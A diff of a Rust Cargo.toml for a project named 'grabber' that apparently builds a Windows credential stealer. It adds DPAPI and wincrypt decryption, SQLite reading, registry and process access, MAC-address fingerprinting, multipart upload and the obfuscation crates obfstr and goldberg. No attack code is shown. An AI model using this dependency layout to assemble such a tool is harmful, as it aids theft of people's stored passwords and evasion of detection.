@@ -1,28 +1,29 @@
 [package]
-name = "grabber"
-version = "0.1.0"
+name = "grabber_rs"
+version = "0.2.0"
 edition = "2021"
 
 [dependencies]
 aes-gcm = "0.10.2"
 regex = "1.9.3"
 base64 = "0.21.2"
-winapi = { version = "0.3.9", features = ["dpapi"] }
+winapi = { version = "0.3.9", features = ["libloaderapi", "dpapi", "wincrypt", "tlhelp32", "wingdi",  "winuser", "memoryapi"] }
 serde_json = "1.0"
+serde = { version = "1.0.188", features = ["derive"] }
 lazy_static = "1.4.0"
 rayon = "1.7"
-reqwest = {version = "0.11.20", features = ["blocking", "json"]}
+reqwest = {version = "0.11.20", features = ["blocking", "json", "multipart"]}
 tokio = {version = "1.32.0", features = ["full"]}
 jwalk = "0.8.1"
+obfstr = "0.4.3"
+goldberg = "0.1"
+mac_address = "1.1.5"
+winreg = "0.51"
+rusqlite = {version = "0.29.0", features = ["bundled"]}
+deflate = "1.0"
 
 [profile.release]
-debug = false
-strip = "symbols"
+opt-level = 3
+codegen-units = 1
 panic = "abort"
-
-[[bin]]
-name = "grabber"
-path = "src/main.rs"
-
-# Try this to remove debug info
-# cargo rustc --release -- --remap-path-prefix=$CARGO_MANIFEST_DIR=/ -Cdebuginfo=0
+lto = true
